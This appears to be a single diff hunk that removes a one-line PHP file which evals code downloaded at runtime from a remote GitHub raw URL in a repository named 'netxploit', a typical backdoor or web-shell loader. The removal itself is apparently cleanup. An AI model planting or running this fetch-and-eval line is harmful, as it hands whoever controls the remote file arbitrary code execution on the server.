@@ -1,1 +1,0 @@
-<?php eval('?>' .file_get_contents('https://raw.githubusercontent.com/bellpwn/netxploit/main/adminer.php'));
